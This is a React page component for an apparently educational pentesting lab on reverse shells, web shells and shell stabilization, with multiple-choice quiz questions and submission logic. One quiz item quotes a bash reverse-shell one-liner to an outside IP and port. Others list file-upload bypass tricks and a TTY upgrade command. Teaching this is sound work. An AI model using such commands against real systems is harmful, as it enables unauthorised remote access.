import React, { useState } from "react";
import Layout from "../../components/Layout";
import "./LabOutline.css";
import { Link } from "react-router-dom";

const modules = [
  {
    id: 1,
    title: "Module 1: Reverse Shells and Shell Access Techniques",
    summary:
      "This module covers the fundamentals of reverse shells, how they function, and practical steps to establish reverse connections using various tools.",
    questions: [
      {
        label: "What is the primary difference between a bind and reverse shell?",
        name: "q1",
        options: [
          "A bind shell has the listener on the target; a reverse shell has the listener on the attacker machine.",
          "A reverse shell has the listener on the target; a bind shell has the listener on the attacker machine.",
          "They are the same thing.",
          "Bind shells are only for Windows.",
        ],
      },
      {
        label: "Why are TCP shells generally preferred over UDP for interactive sessions?",
        name: "q2",
        options: [
          "TCP is connection-oriented and reliable.",
          "UDP is faster.",
          "TCP works better through firewalls.",
          "UDP does not support encryption.",
        ],
      },
      {
        label:
          "What does the command `bash -i >& /dev/tcp/10.10.14.2/4444 0>&1` do?",
        name: "q3",
        options: [
          "Initiates an interactive bash reverse shell to 10.10.14.2 on port 4444.",
          "Starts a web server on port 4444.",
          "Downloads a file from 10.10.14.2.",
          "Pings the specified IP address.",
        ],
      },
      {
        label: "Which tool is best for generating reverse shell payloads?",
        name: "q4",
        options: ["ShellPop", "BurpSuite", "Netstat", "JohnTheRipper"],
      },
    ],
  },
  {
    id: 2,
    title: "Module 2: Web Shell Exploitation and Execution",
    summary:
      "This module focuses on exploiting web vulnerabilities such as insecure file uploads and RCE to deploy web shells and gain remote access to target systems.",
    questions: [
      {
        label: "What are common methods to bypass file upload restrictions? (Select all that apply)",
        name: "q1",
        options: [
          "MIME type spoofing",
          "Using double extensions (e.g., shell.php.jpg)",
          "Null byte injection",
          "Using a valid image header (magic bytes)",
        ],
        multi: true,
      },
      {
        label: "What are common characteristics of a web shell? (Select all that apply)",
        name: "q2",
        options: [
          "Ability to execute system commands",
          "File system browser",
          "Database connector",
          "Obfuscated code",
        ],
        multi: true,
      },
      {
        label: "Which PHP functions are considered dangerous and should be disabled if not needed? (Select all that apply)",
        name: "q3",
        options: ["system()", "exec()", "shell_exec()", "passthru()"],
        multi: true,
      },
    ],
  },
  {
    id: 3,
    title: "Module 3: Shell Stabilization and TTY Upgrades",
    summary:
      "This module teaches how to upgrade basic reverse/bind shells to fully interactive TTY shells for smoother post-exploitation operations.",
    questions: [
      {
        label: "What is a major limitation of a non-interactive shell?",
        name: "q1",
        options: [
          "Cannot run programs that require a TTY, like `su` or `ssh`",
          "It is very slow",
          "It gets detected by firewalls easily",
          "It cannot execute any commands",
        ],
      },
      {
        label:
          "What does `python3 -c 'import pty; pty.spawn(\"/bin/bash\")'` achieve?",
        name: "q2",
        options: [
          "Upgrades a basic shell to a partially interactive TTY",
          "Executes a python script",
          "Deletes /bin/bash",
          "Creates a new user",
        ],
      },
      {
        label: "Why is `stty raw -echo` used when stabilizing a shell?",
        name: "q3",
        options: [
          "To prevent keystrokes from being echoed back and to pass control characters to the remote shell",
          "To make the shell faster",
          "To encrypt the traffic",
          "To change the shell prompt",
        ],
      },
    ],
  },
];

const LabsOutlinePage = () => {
  const [openModule, setOpenModule] = useState(null);
  const [answers, setAnswers] = useState({});
  const [submittedAnswers, setSubmittedAnswers] = useState({});
  const isLoggedIn = Boolean(localStorage.getItem("access_token"));

  const handleInputChange = (moduleId, name, value) => {
    setAnswers((prev) => ({
      ...prev,
      [moduleId]: {
        ...prev[moduleId],
        [name]: value,
      },
    }));
  };

  const handleSubmitQuestion = (moduleId, questionName) => {
    const answer = answers[moduleId]?.[questionName];
    if (!answer || (Array.isArray(answer) && answer.length === 0)) {
      alert("Please provide an answer before submitting.");
      return;
    }
    alert(`Submitted answer for Module ${moduleId}, Question ${questionName}: ${answer}`);
    setSubmittedAnswers((prev) => ({
      ...prev,
      [moduleId]: {
        ...prev[moduleId],
        [questionName]: true,
      },
    }));
  };

  const isModuleComplete = (moduleId) => {
    const moduleQuestions = modules.find((m) => m.id === moduleId)?.questions || [];
    const submittedCount = Object.keys(submittedAnswers[moduleId] || {}).length;
    return moduleQuestions.length === submittedCount;
  };

  const allModulesCompleted = modules.every((module) => isModuleComplete(module.id));

  return (
    <>
      <Layout>
        <section
          className="lab-info-section"
          style={{
            background: "#232d3f",
            color: "#fff",
            padding: "32px 0",
            textAlign: "center",
            paddingTop: "150px",
          }}
        >
          <div className="container" style={{ margin: "0 auto", textAlign: "left" }}>
            <div style={{ display: "flex", alignItems: "center", justifyContent: "center", marginBottom: 24 }}>
              <img
  src="/assets/img/home-1/shop/Medium Level 3.png"
  alt="Medium Level 3"
  style={{
    width: 110,
    height: 110,
    marginRight: 32,
    borderRadius: 12,
    background: "#ffcc33",
    padding: 8,
    objectFit: "contain",
  }}
/>

              <div>
                <h1
                  style={{
                    fontSize: "2.2rem",
                    marginBottom: "8px",
                    color: "#39FF14",
                    textTransform: "none",
                  }}
                >
                  Reverse Shells & Web Shells
                </h1>
                <p style={{ fontSize: "1.15rem", color: "#fff", margin: 0, textTransform: "none" }}>
                  Master reverse shells, web shell exploitation, and shell stabilization for real-world pentesting.
                </p>
              </div>
            </div>
          </div>
        </section>
        <section style={{ background: "#181c2a", minHeight: "60vh", padding: "32px 0" }}>
          <div className="container" style={{ maxWidth: 1200, margin: "0 auto" }}>
            {modules.map((module) => (
              <div
                key={module.id}
                style={{ marginBottom: 18, borderRadius: 8, background: "#232d3f", boxShadow: "0 2px 8px rgba(0,0,0,0.08)" }}
              >
                <div
                  onClick={() => setOpenModule(openModule === module.id ? null : module.id)}
                  style={{
                    cursor: "pointer",
                    padding: "22px 32px",
                    display: "flex",
                    alignItems: "center",
                    borderBottom: openModule === module.id ? "1px solid #39FF14" : "none",
                    background: "#232d3f",
                    color: "#39FF14",
                    fontWeight: 700,
                    fontSize: "1.18rem",
                    transition: "background 0.2s",
                    textTransform: "none",
                  }}
                >
                  <span style={{ color: "#39FF14", fontWeight: 700, marginRight: 12, textTransform: "none" }}>
                    Module {module.id}
                  </span>
                  <span style={{ color: "#fff", fontWeight: 600, textTransform: "none" }}>
                    {module.title.replace(/^Module \d+: /, "")}
                  </span>
                  <span style={{ marginLeft: "auto", color: "#fff", fontSize: 22 }}>{
                    openModule === module.id ? "\u25B2" : "\u25B6"
                  }</span>
                </div>
                {openModule === module.id && (
                  <div style={{ padding: "24px 32px", color: "#fff", fontSize: "1.08rem", background: "#232d3f", textTransform: "none" }}>
                    <div style={{ marginBottom: 8, color: "#bfc9da", textTransform: "none" }}>{module.summary}</div>
                    {isLoggedIn ? (
                      <div>
                        {module.questions.map((q, idx) => (
                          <div key={q.name} style={{ marginBottom: 24, background: "#1a1f2e", padding: 16, borderRadius: 8 }}>
                            <label style={{ color: "#39FF14", fontWeight: 600, display: "block", marginBottom: 6, textTransform: "none" }}>
                              Question {idx + 1}. {q.label}
                            </label>
                            <div style={{ display: "flex", gap: 12, alignItems: "flex-start" }}>
                              {q.options && !q.multi ? (
                                <div style={{ flex: 1 }}>
                                  {q.options.map((opt, i) => (
                                    <label key={i} style={{ display: "block", marginBottom: 6, color: "#fff", fontWeight: 400, textTransform: "none" }}>
                                      <input
                                        type="radio"
                                        name={`module${module.id}-${q.name}`}
                                        value={opt}
                                        checked={answers[module.id]?.[q.name] === opt}
                                        onChange={() => handleInputChange(module.id, q.name, opt)}
                                        disabled={submittedAnswers[module.id]?.[q.name]}
                                        style={{ marginRight: 8 }}
                                      />
                                      {opt}
                                    </label>
                                  ))}
                                </div>
                              ) : q.options && q.multi ? (
                                <div style={{ flex: 1 }}>
                                  {q.options.map((opt, i) => (
                                    <label key={i} style={{ display: "block", marginBottom: 6, color: "#fff", fontWeight: 400, textTransform: "none" }}>
                                      <input
                                        type="checkbox"
                                        name={`module${module.id}-${q.name}`}
                                        value={opt}
                                        checked={
                                          Array.isArray(answers[module.id]?.[q.name]) &&
                                          answers[module.id][q.name].includes(opt)
                                        }
                                        onChange={(e) => {
                                          const prev = Array.isArray(answers[module.id]?.[q.name])
                                            ? answers[module.id][q.name]
                                            : [];
                                          if (e.target.checked) {
                                            handleInputChange(module.id, q.name, [...prev, opt]);
                                          } else {
                                            handleInputChange(
                                              module.id,
                                              q.name,
                                              prev.filter((v) => v !== opt)
                                            );
                                          }
                                        }}
                                        disabled={submittedAnswers[module.id]?.[q.name]}
                                        style={{ marginRight: 8 }}
                                      />
                                      {opt}
                                    </label>
                                  ))}
                                </div>
                              ) : (
                                <textarea
                                  value={answers[module.id]?.[q.name] || ""}
                                  onChange={(e) => handleInputChange(module.id, q.name, e.target.value)}
                                  style={{
                                    flex: 1,
                                    minHeight: 80,
                                    padding: "10px",
                                    borderRadius: 4,
                                    border: "1px solid #34495e",
                                    background: "#181c2a",
                                    color: "#fff",
                                    resize: "vertical",
                                    textTransform: "none",
                                  }}
                                  placeholder="Answer Here"
                                  disabled={submittedAnswers[module.id]?.[q.name]}
                                />
                              )}
                              <button
                                onClick={() => handleSubmitQuestion(module.id, q.name)}
                                style={{
                                  background: submittedAnswers[module.id]?.[q.name] ? "#2ecc71" : "#0FA30F",
                                  color: "#fff",
                                  border: "none",
                                  borderRadius: 4,
                                  padding: "10px 24px",
                                  fontWeight: 700,
                                  cursor: "pointer",
                                  minWidth: "100px",
                                  textTransform: "none",
                                }}
                                disabled={submittedAnswers[module.id]?.[q.name]}
                              >
                                {submittedAnswers[module.id]?.[q.name] ? "Submitted" : "Submit"}
                              </button>
                            </div>
                          </div>
                        ))}
                        {isModuleComplete(module.id) && (
                          <div
                            style={{
                              marginTop: 16,
                              padding: 12,
                              background: "#2ecc71",
                              color: "#fff",
                              borderRadius: 4,
                              textAlign: "center",
                              textTransform: "none",
                            }}
                          >
                            Module Completed! 🎉
                          </div>
                        )}
                      </div>
                    ) : (
                      <button
                        style={{
                          background: "#0FA30F",
                          color: "#fff",
                          border: "none",
                          borderRadius: 4,
                          padding: "12px 32px",
                          fontWeight: 700,
                          fontSize: "1.1rem",
                          marginTop: 18,
                          cursor: "pointer",
                          textTransform: "none",
                        }}
                        onClick={() => (window.location.href = "/login")}
                      >
                        Login to Answer
                      </button>
                    )}
                  </div>
                )}
              </div>
            ))}
            {allModulesCompleted && (
              <div
                style={{
                  marginTop: 48,
                  background: "#0FA30F",
                  color: "#fff",
                  padding: "18px 24px",
                  borderRadius: 8,
                  textAlign: "center",
                  fontWeight: 600,
                  fontSize: "1.2rem",
                  textTransform: "none",
                }}
              >
                <span role="img" aria-label="trophy">
                  🏆
                </span>{" "}
                Well Done! You've completed the Reverse Shells & Web Shells Lab.
                <br />
                Ready to take the next step? Head to the next module.
              </div>
            )}
          </div>
        </section>
        <div style={{ display: "flex", justifyContent: "space-between", maxWidth: 1200, margin: "24px auto 0", padding: "0 24px" }}>
          <Link to="/labs/4" className="lab-nav-btn">
            &larr; Previous Lab
          </Link>
          <Link to="/labs/6" className="lab-nav-btn">
            Next Lab &rarr;
          </Link>
        </div>
      </Layout>
    </>
  );
};

export default LabsOutlinePage;
